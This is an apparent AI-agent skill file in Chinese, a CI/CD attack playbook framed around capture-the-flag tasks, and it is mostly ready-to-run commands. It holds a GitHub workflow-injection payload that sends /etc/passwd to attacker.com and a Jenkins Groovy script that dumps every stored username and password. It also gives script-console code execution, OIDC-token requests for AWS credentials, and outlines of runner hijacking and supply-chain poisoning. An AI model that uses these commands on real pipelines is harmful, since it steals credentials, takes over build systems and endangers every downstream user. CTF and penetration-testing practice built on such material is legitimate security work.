---
name: cicd
description: CI/CD 管线攻击。覆盖 GitHub Actions secret 提取与 workflow 注入、Jenkins 凭证收割与 pipeline 劫持、GitLab CI 滥用、Supply Chain 攻击、OIDC token 滥用、Runner 劫持、Artifact 投毒。
---

# CI/CD 管线攻击

> 当题目涉及 CI/CD 平台（GitHub Actions / Jenkins / GitLab CI / Azure DevOps）、
> 构建管线、容器镜像供应链、secret 管理时使用。
> 离线环境原则：只用本机已有工具（curl / python3 / git），禁止下载外部工具。

## GitHub Actions · 信息收集
```bash
# 枚举仓库 workflow 文件
curl -s -H "Authorization: token $GH_TOKEN" \
  "https://api.github.com/repos/OWNER/REPO/actions/workflows" | python3 -m json.tool
# 拉取 workflow YAML
curl -s -H "Authorization: token $GH_TOKEN" \
  "https://api.github.com/repos/OWNER/REPO/contents/.github/workflows" | python3 -m json.tool
# 查看 workflow 运行历史（找泄露的 secret）
curl -s -H "Authorization: token $GH_TOKEN" \
  "https://api.github.com/repos/OWNER/REPO/actions/runs?per_page=5"
# 查看单个 run 的日志
curl -s -H "Authorization: token $GH_TOKEN" \
  "https://api.github.com/repos/OWNER/REPO/actions/runs/RUN_ID/logs" -L -o logs.zip
```

## GitHub Actions · Secret 提取
```bash
# 从运行日志中提取泄露的 secret（secret 应该被 mask 但有时会泄露）
# 常见泄露方式：
#   - echo $SECRET 直接在日志输出
#   - 拼接到 URL/文件名中被日志记录
#   - base64/编码后被输出（mask 不识别编码后的值）
#   - 在错误信息中暴露（如 curl -H "Authorization: $TOKEN" 失败时）

# 从 workflow 代码审计 secret 名
grep -r "secrets\." .github/workflows/
# 常见 secret 名
#   secrets.GITHUB_TOKEN, secrets.NPM_TOKEN, secrets.AWS_ACCESS_KEY_ID
#   secrets.DOCKER_PASSWORD, secrets.SLACK_WEBHOOK

# GITHUB_TOKEN 权限审计
# 检查 workflow 的 permissions: 字段
# contents: write → 可以推代码（供应链攻击）
# id-token: write → 可以请求 OIDC token（云凭证伪造）
# actions: write → 可以修改 workflow（持久化）
```

## GitHub Actions · Workflow 注入
```bash
# 注入点：pull_request 事件 + github.event.issue.title / pull_request.title
# 如果 workflow 把用户输入直接拼进 run: 命令 → RCE
# 例：
#   run: echo "${{ github.event.issue.title }}"
# 攻击：issue title = '"; curl attacker.com/$(cat /etc/passwd) #'

# 检查所有 workflow 的注入点
grep -rn "github.event" .github/workflows/ | grep -v "github.event.pull_request.head.sha"
# 危险上下文：
#   github.event.issue.title / body
#   github.event.comment.body
#   github.event.pull_request.title / body
#   github.event.head_commit.message / author.name
#   github.event.pages.*.page_name

# Pwn Request：fork 仓库 → 修改 workflow → 提 PR → 目标 CI 执行恶意 workflow
# 检查 workflow trigger：pull_request_target + checkout PR head → 可利用
```

## GitHub Actions · OIDC Token 滥用
```bash
# 如果 workflow 有 id-token: write → 可以请求 OIDC JWT
# OIDC token 可以换取云凭证（AWS STS / Azure AD / GCP Workload Identity）
curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com"
# 返回的 JWT → 换取 AWS 临时凭证
# 检查 workflow 是否信任了过宽的 OIDC condition（如只检查 repo 不检查 branch）
```

## Jenkins · 信息收集
```bash
# Jenkins API 枚举
curl -s -u user:pass http://$TARGET:8080/api/json?pretty=true
# 列出所有 job
curl -s -u user:pass http://$TARGET:8080/api/json?tree=jobs[name,color,url]
# 查看 job 配置（可能含明文凭证）
curl -s -u user:pass "http://$TARGET:8080/job/JOBNAME/config.xml"
# 查看构建历史
curl -s -u user:pass "http://$TARGET:8080/job/JOBNAME/api/json?tree=builds[number,result]"
# 查看构建控制台输出
curl -s -u user:pass "http://$TARGET:8080/job/JOBNAME/BUILDNUM/consoleText"
```

## Jenkins · 凭证收割
```bash
# Jenkins credential manager API
curl -s -u user:pass "http://$TARGET:8080/credentials/store/system/domain/_/api/json"
# 列出所有 credential ID
curl -s -u user:pass "http://$TARGET:8080/credentials/store/system/domain/_/api/json?depth=1"
# 通过 Groovy script console 提取凭证（需要 admin）
curl -s -u admin:pass "http://$TARGET:8080/scriptText" \
  --data-urlencode 'script=
import jenkins.model.*
import com.cloudbees.plugins.credentials.*
import com.cloudbees.plugins.credentials.impl.*
CredentialsProvider.lookupCredentials(
  com.cloudbees.plugins.credentials.common.StandardUsernamePasswordCredentials.class,
  Jenkins.instance
).each {
  println("${it.id}:${it.username}:${it.password}")
}
'
# Script console → 任意代码执行
curl -s -u admin:pass "http://$TARGET:8080/scriptText" \
  --data-urlencode 'script=println "whoami".execute().text'
```

## Jenkins · Pipeline 劫持
```bash
# 如果有 job 创建/编辑权限 → 创建恶意 pipeline
# Jenkinsfile 注入：修改 Jenkinsfile → 下次构建执行恶意代码
# Shared Library 投毒：修改共享库 → 所有使用该库的 pipeline 被感染
# 检查 Jenkins 版本和插件漏洞
curl -s "http://$TARGET:8080/api/json" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('version','?'))"
```

## GitLab CI · 攻击面
```bash
# GitLab API 枚举
curl -s -H "PRIVATE-TOKEN: $TOKEN" "http://$TARGET/api/v4/projects"
# 查看 CI/CD 变量（可能含 secret）
curl -s -H "PRIVATE-TOKEN: $TOKEN" "http://$TARGET/api/v4/projects/PROJECT_ID/variables"
# 查看 .gitlab-ci.yml
curl -s -H "PRIVATE-TOKEN: $TOKEN" \
  "http://$TARGET/api/v4/projects/PROJECT_ID/repository/files/.gitlab-ci.yml/raw?ref=main"
# Pipeline job 日志（可能泄露 secret）
curl -s -H "PRIVATE-TOKEN: $TOKEN" \
  "http://$TARGET/api/v4/projects/PROJECT_ID/jobs/JOB_ID/trace"
# Runner 注册 token → 注册恶意 runner → 截获所有 CI job
# 检查 CI_DEBUG_TRACE: true → 所有变量被打印到日志
```

## Supply Chain · 容器镜像
```bash
# 检查 Dockerfile 基础镜像是否可劫持（tag 可变 / 来自不可信源）
# 检查依赖包是否有已知漏洞
# 如果有权访问 registry：
# 列出镜像 tag
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://REGISTRY/v2/REPO/tags/list"
# 拉取 manifest 检查各层
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://REGISTRY/v2/REPO/manifests/TAG" \
  -H "Accept: application/vnd.docker.distribution.manifest.v2+json"
```

## Artifact 投毒
```bash
# CI artifact 如果被篡改 → 下游消费者被感染
# 检查 artifact 上传/下载步骤是否有路径穿越
# GitHub Actions: actions/upload-artifact + actions/download-artifact
# 如果 upload 路径可被攻击者控制 → 覆盖关键文件
# 检查 artifact retention 和权限
```

## 关键规则
- **先审计 workflow 代码**：找注入点（用户输入直接拼进 run:）和权限过大（id-token: write）
- **日志是金矿**：CI 日志经常泄露 secret、token、内部 URL
- **Script Console = RCE**：Jenkins script console 是最直接的代码执行入口
- **Credential API**：Jenkins/GitLab 的 credential manager 里通常存着大量第三方凭证
- **OIDC token**：现代 CI/CD 的趋势，能换取云凭证（AWS/Azure/GCP），价值极高
- **flag 位置**：通常在 CI 环境变量、credential store、构建日志、部署目标
